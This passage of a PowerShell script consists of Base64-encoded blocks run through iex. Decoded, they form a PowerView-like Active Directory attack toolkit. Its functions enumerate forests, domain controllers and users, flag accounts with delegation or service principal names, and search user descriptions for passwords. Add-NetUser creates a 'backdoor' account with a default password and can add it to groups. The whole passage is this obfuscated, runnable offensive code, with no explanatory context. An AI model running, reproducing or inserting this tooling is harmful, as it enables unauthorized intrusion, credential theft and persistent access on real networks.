IGVsc2UgewogICAgICAgICAgICAkRm9yZXN0T2JqZWN0ID0gW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnkuRm9yZXN0XTo6R2V0Q3VycmVudEZvcmVzdCgpCiAgICAgICAgfQogICAgICAgIGlmKCRGb3Jlc3RPYmplY3QpIHsKICAgICAgICAgICAgJEZvcmVzdFNpZCA9IChOZXctT2JqZWN0IFN5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuTlRBY2NvdW50KCRGb3Jlc3RPYmplY3QuUm9vdERvbWFpbiwia3JidGd0IikpLlRyYW5zbGF0ZShbU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbC5TZWN1cml0eUlkZW50aWZpZXJdKS5WYWx1ZQogICAgICAgICAgICAkUGFydHMgPSAkRm9yZXN0U2lkIC1TcGxpdCAiLSIKICAgICAgICAgICAgJEZvcmVzdFNpZCA9ICRQYXJ0c1swLi4kKCRQYXJ0cy5sZW5ndGgtMildIC1qb2luICItIgogICAgICAgICAgICAkRm9yZXN0T2JqZWN0IHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ1Jvb3REb21haW5TaWQnICRGb3Jlc3RTaWQKICAgICAgICAgICAgJEZvcmVzdE9iamVjdAogICAgICAgIH0KICAgIH0KfQo=")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LU5ldEZvcmVzdERvbWFpbiB7CiAgICBbQ21kbGV0QmluZGluZygpXQogICAgcGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihWYWx1ZUZyb21QaXBlbGluZT0kVHJ1ZSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRm9yZXN0LAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbgogICAgKQogICAgcHJvY2VzcyB7CiAgICAgICAgaWYoJERvbWFpbikgewogICAgICAgICAgICBpZigkRG9tYWluLkNvbnRhaW5zKCcqJykpIHsKICAgICAgICAgICAgICAgIChHZXQtTmV0Rm9yZXN0IC1Gb3Jlc3QgJEZvcmVzdCkuRG9tYWlucyB8IFdoZXJlLU9iamVjdCB7JF8uTmFtZSAtbGlrZSAkRG9tYWlufQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgKEdldC1OZXRGb3Jlc3QgLUZvcmVzdCAkRm9yZXN0KS5Eb21haW5zIHwgV2hlcmUtT2JqZWN0IHskXy5OYW1lLlRvTG93ZXIoKSAtZXEgJERvbWFpbi5Ub0xvd2VyKCl9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICRGb3Jlc3RPYmplY3QgPSBHZXQtTmV0Rm9yZXN0IC1Gb3Jlc3QgJEZvcmVzdAogICAgICAgICAgICBpZigkRm9yZXN0T2JqZWN0KSB7CiAgICAgICAgICAgICAgICAkRm9yZXN0T2JqZWN0LkRvbWFpbnMKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQo=")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LU5ldEZvcmVzdENhdGFsb2cgewogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIHBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoVmFsdWVGcm9tUGlwZWxpbmU9JFRydWUpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJEZvcmVzdAogICAgKQogICAgcHJvY2VzcyB7CiAgICAgICAgJEZvcmVzdE9iamVjdCA9IEdldC1OZXRGb3Jlc3QgLUZvcmVzdCAkRm9yZXN0CiAgICAgICAgaWYoJEZvcmVzdE9iamVjdCkgewogICAgICAgICAgICAkRm9yZXN0T2JqZWN0LkZpbmRBbGxHbG9iYWxDYXRhbG9ncygpCiAgICAgICAgfQogICAgfQp9Cg==")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LU5ldERvbWFpbkNvbnRyb2xsZXIgewogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIHBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoVmFsdWVGcm9tUGlwZWxpbmU9JFRydWUpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiwKICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW5Db250cm9sbGVyLAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJExEQVAKICAgICkKICAgIHByb2Nlc3MgewogICAgICAgIGlmKCRMREFQIC1vciAkRG9tYWluQ29udHJvbGxlcikgewogICAgICAgICAgICBHZXQtTmV0Q29tcHV0ZXIgLURvbWFpbiAkRG9tYWluIC1Eb21haW5Db250cm9sbGVyICREb21haW5Db250cm9sbGVyIC1GdWxsRGF0YSAtRmlsdGVyICcodXNlckFjY291bnRDb250cm9sOjEuMi44NDAuMTEzNTU2LjEuNC44MDM6PTgxOTIpJwogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgJEZvdW5kRG9tYWluID0gR2V0LU5ldERvbWFpbiAtRG9tYWluICREb21haW4KICAgICAgICAgICAgaWYoJEZvdW5kRG9tYWluKSB7CiAgICAgICAgICAgICAgICAkRm91bmRkb21haW4uRG9tYWluQ29udHJvbGxlcnMKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQo=")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LU5ldFVzZXIgewogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIHBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoVmFsdWVGcm9tUGlwZWxpbmU9JFRydWUpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFVzZXJOYW1lLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiwKICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW5Db250cm9sbGVyLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJEFEU3BhdGgsCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRmlsdGVyLAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFNQTiwKICAgICAgICBbU3dpdGNoXQogICAgICAgICRBZG1pbkNvdW50LAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFVuY29uc3RyYWluZWQsCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkQWxsb3dEZWxlZ2F0aW9uLAogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsMTAwMDApXSAKICAgICAgICBbSW50XQogICAgICAgICRQYWdlU2l6ZSA9IDIwMAogICAgKQogICAgYmVnaW4gewogICAgICAgICRVc2VyU2VhcmNoZXIgPSBHZXQtRG9tYWluU2VhcmNoZXIgLURvbWFpbiAkRG9tYWluIC1BRFNwYXRoICRBRFNwYXRoIC1Eb21haW5Db250cm9sbGVyICREb21haW5Db250cm9sbGVyIC1QYWdlU2l6ZSAkUGFnZVNpemUKICAgIH0KICAgIHByb2Nlc3MgewogICAgICAgIGlmKCRVc2VyU2VhcmNoZXIpIHsKICAgICAgICAgICAgaWYoJFVuY29uc3RyYWluZWQpIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkNoZWNraW5nIGZvciB1bmNvbnN0cmFpbmVkIGRlbGVnYXRpb24iCiAgICAgICAgICAgICAgICAkRmlsdGVyICs9ICIodXNlckFjY291bnRDb250cm9sOjEuMi44NDAuMTEzNTU2LjEuNC44MDM6PTUyNDI4OCkiCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYoJEFsbG93RGVsZWdhdGlvbikgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiQ2hlY2tpbmcgZm9yIHVzZXJzIHdobyBjYW4gYmUgZGVsZWdhdGVkIgogICAgICAgICAgICAgICAgJEZpbHRlciArPSAiKCEodXNlckFjY291bnRDb250cm9sOjEuMi44NDAuMTEzNTU2LjEuNC44MDM6PTEwNDg1NzQpKSIKICAgICAgICAgICAgfQogICAgICAgICAgICBpZigkQWRtaW5Db3VudCkgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiQ2hlY2tpbmcgZm9yIGFkbWluQ291bnQ9MSIKICAgICAgICAgICAgICAgICRGaWx0ZXIgKz0gIihhZG1pbmNvdW50PTEpIgogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmKCRVc2VyTmFtZSkgewogICAgICAgICAgICAgICAgJFVzZXJTZWFyY2hlci5maWx0ZXI9IigmKHNhbUFjY291bnRUeXBlPTgwNTMwNjM2OCkoc2FtQWNjb3VudE5hbWU9JFVzZXJOYW1lKSRGaWx0ZXIpIgogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2VpZigkU1BOKSB7CiAgICAgICAgICAgICAgICAkVXNlclNlYXJjaGVyLmZpbHRlcj0iKCYoc2FtQWNjb3VudFR5cGU9ODA1MzA2MzY4KShzZXJ2aWNlUHJpbmNpcGFsTmFtZT0qKSRGaWx0ZXIpIgogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgJFVzZXJTZWFyY2hlci5maWx0ZXI9IigmKHNhbUFjY291bnRUeXBlPTgwNTMwNjM2OCkkRmlsdGVyKSIKICAgICAgICAgICAgfQogICAgICAgICAgICAkVXNlclNlYXJjaGVyLkZpbmRBbGwoKSB8IFdoZXJlLU9iamVjdCB7JF99IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgQ29udmVydC1MREFQUHJvcGVydHkgLVByb3BlcnRpZXMgJF8uUHJvcGVydGllcwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9Cg==")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gQWRkLU5ldFVzZXIgewogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtICgKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFVzZXJOYW1lID0gJ2JhY2tkb29yJywKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFBhc3N3b3JkID0gJ1Bhc3N3b3JkMTIzIScsCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRHcm91cE5hbWUsCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0hvc3ROYW1lJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJOYW1lID0gJ2xvY2FsaG9zdCcsCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4KICAgICkKICAgIGlmICgkRG9tYWluKSB7CiAgICAgICAgJERvbWFpbk9iamVjdCA9IEdldC1OZXREb21haW4gLURvbWFpbiAkRG9tYWluCiAgICAgICAgaWYoLW5vdCAkRG9tYWluT2JqZWN0KSB7CiAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIkVycm9yIGluIGdyYWJiaW5nICREb21haW4gb2JqZWN0IgogICAgICAgICAgICByZXR1cm4gJE51bGwKICAgICAgICB9CiAgICAgICAgQWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWNjb3VudE1hbmFnZW1lbnQKICAgICAgICAkQ29udGV4dCA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY2NvdW50TWFuYWdlbWVudC5QcmluY2lwYWxDb250ZXh0IC1Bcmd1bWVudExpc3QgKFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWNjb3VudE1hbmFnZW1lbnQuQ29udGV4dFR5cGVdOjpEb21haW4pLCAkRG9tYWluT2JqZWN0CiAgICAgICAgJFVzZXIgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWNjb3VudE1hbmFnZW1lbnQuVXNlclByaW5jaXBhbCAtQXJndW1lbnRMaXN0ICRDb250ZXh0CiAgICAgICAgJFVzZXIuTmFtZSA9ICRVc2VyTmFtZQogICAgICAgICRVc2VyLlNhbUFjY291bnROYW1lID0gJFVzZXJOYW1lCiAgICAgICAgJFVzZXIuUGFzc3dvcmROb3RSZXF1aXJlZCA9ICRGYWxzZQogICAgICAgICRVc2VyLlNldFBhc3N3b3JkKCRQYXNzd29yZCkKICAgICAgICAkVXNlci5FbmFibGVkID0gJFRydWUKICAgICAgICBXcml0ZS1WZXJib3NlICJDcmVhdGluZyB1c2VyICRVc2VyTmFtZSB0byB3aXRoIHBhc3N3b3JkICckUGFzc3dvcmQnIGluIGRvbWFpbiAkRG9tYWluIgogICAgICAgIHRyeSB7CiAgICAgICAgICAgICRVc2VyLlNhdmUoKQogICAgICAgICAgICAiWypdIFVzZXIgJFVzZXJOYW1lIHN1Y2Nlc3NmdWxseSBjcmVhdGVkIGluIGRvbWFpbiAkRG9tYWluIgogICAgICAgIH0KICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgJ1shXSBVc2VyIGFscmVhZHkgZXhpc3RzIScKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgfQogICAgfQogICAgZWxzZSB7CiAgICAgICAgV3JpdGUtVmVyYm9zZSAiQ3JlYXRpbmcgdXNlciAkVXNlck5hbWUgdG8gd2l0aCBwYXNzd29yZCAnJFBhc3N3b3JkJyBvbiAkQ29tcHV0ZXJOYW1lIgogICAgICAgICRPYmpPdSA9IFtBRFNJXSJXaW5OVDovLyRDb21wdXRlck5hbWUiCiAgICAgICAgJE9ialVzZXIgPSAkT2JqT3UuQ3JlYXRlKCdVc2VyJywgJFVzZXJOYW1lKQogICAgICAgICRPYmpVc2VyLlNldFBhc3N3b3JkKCRQYXNzd29yZCkKICAgICAgICB0cnkgewogICAgICAgICAgICAkTnVsbCA9ICRPYmpVc2VyLlNldEluZm8oKQogICAgICAgICAgICAiWypdIFVzZXIgJFVzZXJOYW1lIHN1Y2Nlc3NmdWxseSBjcmVhdGVkIG9uIGhvc3QgJENvbXB1dGVyTmFtZSIKICAgICAgICB9CiAgICAgICAgY2F0Y2ggewogICAgICAgICAgICBXcml0ZS1XYXJuaW5nICdbIV0gQWNjb3VudCBhbHJlYWR5IGV4aXN0cyEnCiAgICAgICAgICAgIHJldHVybgogICAgICAgIH0KICAgIH0KICAgIGlmICgkR3JvdXBOYW1lKSB7CiAgICAgICAgaWYgKCREb21haW4pIHsKICAgICAgICAgICAgQWRkLU5ldEdyb3VwVXNlciAtVXNlck5hbWUgJFVzZXJOYW1lIC1Hcm91cE5hbWUgJEdyb3VwTmFtZSAtRG9tYWluICREb21haW4KICAgICAgICAgICAgIlsqXSBVc2VyICRVc2VyTmFtZSBzdWNjZXNzZnVsbHkgYWRkZWQgdG8gZ3JvdXAgJEdyb3VwTmFtZSBpbiBkb21haW4gJERvbWFpbiIKICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgIEFkZC1OZXRHcm91cFVzZXIgLVVzZXJOYW1lICRVc2VyTmFtZSAtR3JvdXBOYW1lICRHcm91cE5hbWUgLUNvbXB1dGVyTmFtZSAkQ29tcHV0ZXJOYW1lCiAgICAgICAgICAgICJbKl0gVXNlciAkVXNlck5hbWUgc3VjY2Vzc2Z1bGx5IGFkZGVkIHRvIGdyb3VwICRHcm91cE5hbWUgb24gaG9zdCAkQ29tcHV0ZXJOYW1lIgogICAgICAgIH0KICAgIH0KfQo=")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gQWRkLU5ldEdyb3VwVXNlciB7CiAgICBbQ21kbGV0QmluZGluZygpXQogICAgcGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRVc2VyTmFtZSwKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRUcnVlKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJEdyb3VwTmFtZSwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnSG9zdE5hbWUnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDb21wdXRlck5hbWUsCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluCiAgICApCiAgICBBZGQtVHlwZSAtQXNzZW1ibHlOYW1lIFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY2NvdW50TWFuYWdlbWVudAogICAgaWYoJENvbXB1dGVyTmFtZSAtYW5kICgkQ29tcHV0ZXJOYW1lIC1uZSAibG9jYWxob3N0IikpIHsKICAgICAgICB0cnkgewogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJBZGRpbmcgdXNlciAkVXNlck5hbWUgdG8gJEdyb3VwTmFtZSBvbiBob3N0ICRDb21wdXRlck5hbWUiCiAgICAgICAgICAgIChbQURTSV0iV2luTlQ6Ly8kQ29tcHV0ZXJOYW1lLyRHcm91cE5hbWUsZ3JvdXAiKS5hZGQoIldpbk5UOi8vJENvbXB1dGVyTmFtZS8kVXNlck5hbWUsdXNlciIpCiAgICAgICAgICAgICJbKl0gVXNlciAkVXNlck5hbWUgc3VjY2Vzc2Z1bGx5IGFkZGVkIHRvIGdyb3VwICRHcm91cE5hbWUgb24gJENvbXB1dGVyTmFtZSIKICAgICAgICB9CiAgICAgICAgY2F0Y2ggewogICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbIV0gRXJyb3IgYWRkaW5nIHVzZXIgJFVzZXJOYW1lIHRvIGdyb3VwICRHcm91cE5hbWUgb24gJENvbXB1dGVyTmFtZSIKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgfQogICAgfQogICAgZWxzZSB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgaWYgKCREb21haW4pIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkFkZGluZyB1c2VyICRVc2VyTmFtZSB0byAkR3JvdXBOYW1lIG9uIGRvbWFpbiAkRG9tYWluIgogICAgICAgICAgICAgICAgJENUID0gW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY2NvdW50TWFuYWdlbWVudC5Db250ZXh0VHlwZV06OkRvbWFpbgogICAgICAgICAgICAgICAgJERvbWFpbk9iamVjdCA9IEdldC1OZXREb21haW4gLURvbWFpbiAkRG9tYWluCiAgICAgICAgICAgICAgICBpZigtbm90ICREb21haW5PYmplY3QpIHsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gJE51bGwKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICRDb250ZXh0ID0gTmV3LU9iamVjdCAtVHlwZU5hbWUgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjY291bnRNYW5hZ2VtZW50LlByaW5jaXBhbENvbnRleHQgLUFyZ3VtZW50TGlzdCAkQ1QsICREb21haW5PYmplY3QgICAgICAgICAgICAKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkFkZGluZyB1c2VyICRVc2VyTmFtZSB0byAkR3JvdXBOYW1lIG9uIGxvY2FsaG9zdCIKICAgICAgICAgICAgICAgICRDb250ZXh0ID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWNjb3VudE1hbmFnZW1lbnQuUHJpbmNpcGFsQ29udGV4dChbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjY291bnRNYW5hZ2VtZW50LkNvbnRleHRUeXBlXTo6TWFjaGluZSwgJEVudjpDb21wdXRlck5hbWUpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgJEdyb3VwID0gW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY2NvdW50TWFuYWdlbWVudC5Hcm91cFByaW5jaXBhbF06OkZpbmRCeUlkZW50aXR5KCRDb250ZXh0LCRHcm91cE5hbWUpCiAgICAgICAgICAgICRHcm91cC5NZW1iZXJzLmFkZCgkQ29udGV4dCwgW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY2NvdW50TWFuYWdlbWVudC5JZGVudGl0eVR5cGVdOjpTYW1BY2NvdW50TmFtZSwgJFVzZXJOYW1lKQogICAgICAgICAgICAkR3JvdXAuU2F2ZSgpCiAgICAgICAgfQogICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiRXJyb3IgYWRkaW5nICRVc2VyTmFtZSB0byAkR3JvdXBOYW1lIDogJF8iCiAgICAgICAgfQogICAgfQp9Cg==")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LVVzZXJQcm9wZXJ0eSB7CiAgICBbQ21kbGV0QmluZGluZygpXQogICAgcGFyYW0oCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRQcm9wZXJ0aWVzLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiwKICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW5Db250cm9sbGVyLAogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsMTAwMDApXSAKICAgICAgICBbSW50XQogICAgICAgICRQYWdlU2l6ZSA9IDIwMAogICAgKQogICAgaWYoJFByb3BlcnRpZXMpIHsKICAgICAgICAkUHJvcGVydGllcyA9ICwibmFtZSIgKyAkUHJvcGVydGllcwogICAgICAgIEdldC1OZXRVc2VyIC1Eb21haW4gJERvbWFpbiAtRG9tYWluQ29udHJvbGxlciAkRG9tYWluQ29udHJvbGxlciAtUGFnZVNpemUgJFBhZ2VTaXplIHwgU2VsZWN0LU9iamVjdCAtUHJvcGVydHkgJFByb3BlcnRpZXMKICAgIH0KICAgIGVsc2UgewogICAgICAgIEdldC1OZXRVc2VyIC1Eb21haW4gJERvbWFpbiAtRG9tYWluQ29udHJvbGxlciAkRG9tYWluQ29udHJvbGxlciAtUGFnZVNpemUgJFBhZ2VTaXplIHwgU2VsZWN0LU9iamVjdCAtRmlyc3QgMSB8IEdldC1NZW1iZXIgLU1lbWJlclR5cGUgKlByb3BlcnR5IHwgU2VsZWN0LU9iamVjdCAtUHJvcGVydHkgJ05hbWUnCiAgICB9Cn0K")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gRmluZC1Vc2VyRmllbGQgewogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIHBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb249MCxWYWx1ZUZyb21QaXBlbGluZT0kVHJ1ZSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoVGVybSA9ICdwYXNzJywKICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hGaWVsZCA9ICdkZXNjcmlwdGlvbicsCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQURTcGF0aCwKICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluQ29udHJvbGxlciwKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLDEwMDAwKV0gCiAgICAgICAgW0ludF0KICAgICAgICAkUGFnZVNpemUgPSAyMDAKICAgICkKICAgIHByb2Nlc3MgewogICAgICAgIEdldC1OZXRVc2VyIC1BRFNwYXRoICRBRFNwYXRoIC1Eb21haW4gJERvbWFpbiAtRG9tYWluQ29udHJvbGxlciAkRG9tYWluQ29udHJvbGxlciAtRmlsdGVyICIoJFNlYXJjaEZpZWxkPSokU2VhcmNoVGVybSopIiAtUGFnZVNpemUgJFBhZ2VTaXplIHwgU2VsZWN0LU9iamVjdCBzYW1hY2NvdW50bmFtZSwkU2VhcmNoRmllbGQKICAgIH0KfQo=")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LVVzZXJFdmVudCB7CiAgICBQYXJhbSgKICAgICAgICBbU3RyaW5nXQogICAgICAgICRDb21wdXRlck5hbWUgPSAkRW52OkNvbXB1dGVyTmFtZSwKICAgICAgICBbU3RyaW5nXQogICAgICAgIFtWYWxpZGF0ZVNldCgibG9nb24iLCJ0Z3QiLCJhbGwiKV0KICAgICAgICAkRXZlbnRUeXBlID0gImxvZ29uIiwKICAgICAgICBbRGF0ZVRpbWVdCiAgICAgICAgJERhdGVTdGFydD1bRGF0ZVRpbWVdOjpUb2RheS5BZGREYXlzKC01KQogICAgKQogICAgaWYoJEV2ZW50VHlwZS5Ub0xvd2VyKCkgLWxpa2UgImxvZ29uIikgewogICAgICAgIFtJbnQzMltdXSRJRCA9IEAoNDYyNCkKICAgIH0KICAgIGVsc2VpZigkRXZlbnRUeXBlLlRvTG93ZXIoKSAtbGlrZSAidGd0IikgewogICAgICAgIFtJbnQzMltdXSRJRCA9IEAoNDc2OCkKICAgIH0KICAgIGVsc2UgewogICAgICAgIFtJbnQzMltdXSRJRCA9IEAoNDYyNCwgNDc2OCkKICAgIH0KICAgIEdldC1XaW5FdmVudCAtQ29tcHV0ZXJOYW1lICRDb21wdXRlck5hbWUgLUZpbHRlckhhc2hUYWJsZSBAeyBMb2dOYW1lID0gJ1NlY3VyaXR5JzsgSUQ9JElEOyBTdGFydFRpbWU9JERhdGVTdGFydH0gLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgaWYoJElEIC1jb250YWlucyA0NjI0KSB7ICAgIAogICAgICAgICAgICBpZigkXy5tZXNzYWdlIC1tYXRjaCAnKD9zKSg/PD1Mb2dvbiBUeXBlOikuKj8oPz0oSW1wZXJzb25hdGlvbiBMZXZlbDp8TmV3IExvZ29uOikpJykgewogICAgICAgICAgICAgICAgaWYoJE1hdGNoZXMpIHsKICAgICAgICAgICAgICAgICAgICAkTG9nb25UeXBlID0gJE1hdGNoZXNbMF0udHJpbSgpCiAgICAgICAgICAgICAgICAgICAgJE1hdGNoZXMgPSAkTnVsbAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgJExvZ29uVHlwZSA9ICIiCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCgkTG9nb25UeXBlIC1lcSAyKSAtb3IgKCRMb2dvblR5cGUgLWVxIDMpKSB7CiAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgIGlmKCRfLm1lc3NhZ2UgLW1hdGNoICcoP3MpKD88PU5ldyBMb2dvbjopLio/KD89UHJvY2VzcyBJbmZvcm1hdGlvbjopJykgewogICAgICAgICAgICAgICAgICAgICAgICBpZigkTWF0Y2hlcykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFVzZXJOYW1lID0gJE1hdGNoZXNbMF0uc3BsaXQoImBuIilbMl0uc3BsaXQoIjoiKVsxXS50cmltKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICREb21haW4gPSAkTWF0Y2hlc1swXS5zcGxpdCgiYG4iKVszXS5zcGxpdCgiOiIpWzFdLnRyaW0oKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE1hdGNoZXMgPSAkTnVsbAogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGlmKCRfLm1lc3NhZ2UgLW1hdGNoICcoP3MpKD88PU5ldHdvcmsgSW5mb3JtYXRpb246KS4qPyg/PVNvdXJjZSBQb3J0OiknKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRNYXRjaGVzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkQWRkcmVzcyA9ICRNYXRjaGVzWzBdLnNwbGl0KCJgbiIpWzJdLnNwbGl0KCI6IilbMV0udHJpbSgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTWF0Y2hlcyA9ICROdWxsCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgaWYgKCRVc2VyTmFtZSAtYW5kICgtbm90ICRVc2VyTmFtZS5lbmRzV2l0aCgnJCcpKSAtYW5kICgkVXNlck5hbWUgLW5lICdBTk9OWU1PVVMgTE9HT04nKSkgewogICAgICAgICAgICAgICAgICAgICAgICAkTG9nb25FdmVudFByb3BlcnRpZXMgPSBAewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ0RvbWFpbicgPSAkRG9tYWluCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnQ29tcHV0ZXJOYW1lJyA9ICRDb21wdXRlck5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICdVc2VybmFtZScgPSAkVXNlck5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICdBZGRyZXNzJyA9ICRBZGRyZXNzCiAgICAgIC